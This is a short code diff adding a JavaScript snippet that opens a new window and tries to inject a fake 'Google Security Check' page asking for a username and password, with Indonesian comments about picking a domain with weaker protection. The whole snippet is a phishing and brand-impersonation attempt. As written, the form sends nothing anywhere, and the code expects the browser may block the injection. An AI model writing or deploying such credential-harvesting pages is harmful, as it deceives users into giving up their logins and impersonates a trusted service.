@@ -1,0 +1,28 @@
+<script>
+function spoof() {
+  // Coba domain yang kurang protection
+  let domains = [
+    "http://httpforever.com/",  // HTTP site (less protection)
+    "about:blank",
+    "data:text/html,<h1>Loading...</h1>"
+  ];
+  
+  let win = window.open(domains[0], "_blank");
+  
+  setTimeout(() => {
+    try {
+      win.document.body.innerHTML = `
+        <h1>Google Security Check</h1>
+        <p>Enter your credentials:</p>
+        <form>
+          <input type="text" placeholder="Username">
+          <input type="password" placeholder="Password">  
+          <button>Submit</button>
+        </form>
+      `;
+    } catch(e) {
+      console.log("Still blocked");
+    }
+  }, 100);
+}
+</script>
